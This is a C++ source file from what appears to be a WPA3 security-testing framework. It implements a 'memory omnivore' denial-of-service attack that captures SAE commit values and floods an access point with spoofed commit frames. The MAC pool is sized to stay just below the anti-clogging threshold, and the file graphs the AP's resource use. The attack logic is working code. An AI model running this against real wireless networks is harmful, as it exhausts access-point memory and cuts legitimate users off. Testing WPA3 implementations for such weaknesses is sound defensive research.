#include "attacks/DoS_hard/memory_omnivore/memory_omnivore.h"

#include <tins/tins.h>
#include <unordered_map>

#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "config/RunStatus.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "system/firmware/ath9k_htc.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::memory_omnivore {

static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas) {
	vector<HWAddress<6>> pool;
	const auto attacker_mac = rs.get_actor("attacker").get(SK::mac);
	if(use_connected_stas) {
		pool = dos_helpers::get_connected_stas(rs);
		pool.resize(min(static_cast<int>(pool.size()), pool_size));

		if(static_cast<int>(pool.size()) < pool_size) {
			log(LogLevel::WARNING,
				"Only {} connected STAs available (need {}), padding with random MACs",
				pool.size(),
				pool_size);
			while(static_cast<int>(pool.size()) < pool_size)
				pool.emplace_back(firmware::get_rotating_ath_masker_mac(attacker_mac));
		} else {
			log(LogLevel::INFO, "Using {} connected STA MACs", pool_size);
		}
		return pool;
	}

	pool.reserve(pool_size);
	for(int i = 0; i < pool_size; ++i) pool.emplace_back(firmware::get_rotating_ath_masker_mac(attacker_mac));
	log(LogLevel::INFO, "Using {} random MACs", pool_size);
	return pool;
}

void run_attack(RunStatus &rs) {
	const ActorPtr attacker = rs.get_actor("attacker");
	const ActorPtr ap = rs.get_actor("ap");

	log(LogLevel::INFO, "Capturing SAE commit values...");

	const auto &att_cfg = rs.config().at("attack_config");
	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
	const int burst_size = att_cfg.at("burst_size").get<int>();
	const int acm_threshold = att_cfg.at("acm_threshold").get<int>();
	const bool random_dh = att_cfg.at("random_dh_groups").get<bool>();
	const bool use_conn_stas = att_cfg.at("use_connected_stas").get<bool>();

	const string ap_ssid = hostapd::get_ssid(rs, "ap");
	const string ssid = ap_ssid.empty() ? hostapd::get_ssid(rs, "client") : ap_ssid;
	const HWAddress<6> ap_mac = ap.get(SK::mac);

	auto sae_per_group = random_dh
		? cookie_guzzler::get_commit_values_all_groups(rs, attacker.get(SK::iface), attacker.get_mon_iface(), ssid, ap_mac)
		: [&]() -> unordered_map<uint16_t, sae_helper::SAEPair> {
			auto s = cookie_guzzler::get_commit_values(rs, attacker.get(SK::iface), attacker.get_mon_iface(), ssid, ap_mac, 30); //TODO hardcoded sae group
			if(!s) throw run_err("Failed to capture SAE commit values");
			return {{s->group_id, std::move(*s)}};
		}();

	if(sae_per_group.empty()) throw run_err("Failed to capture SAE commit values for any group");

	vector<uint16_t> available_groups;
	for(const auto &[gid, sae] : sae_per_group) {
		log(LogLevel::INFO, "Group {}: scalar={}B element={}B", gid, sae.scalar.size(), sae.element.size());
		available_groups.push_back(gid);
	}
	ranges::sort(available_groups);

	// Pool size must stay strictly below ACM threshold
	const int pool_size = max(1, acm_threshold - 1);

	const vector<HWAddress<6>> mac_pool = build_mac_pool(rs, pool_size, use_conn_stas);

	PacketSender sender(attacker.get_mon_iface());

	rs.start_observers();
	log(LogLevel::INFO, "Attack started with {} group(s), pool_size={}", available_groups.size(), pool_size);

	size_t frame_idx = 0;
	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	rs.process_manager.write_log_all(ATTACK_START_tag);
	dos_helpers::timed_burst(
		sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
			const auto &sta_mac = mac_pool[frame_idx % mac_pool.size()];
			const uint16_t gid = random_dh ? available_groups[frame_idx % available_groups.size()] : available_groups.front();
			frame_idx++;
			return make_sae_commit(ap_mac, sta_mac, sae_per_group.at(gid));
		});
	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
	ap->disconnect();
}

void stats_attack(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
}
}
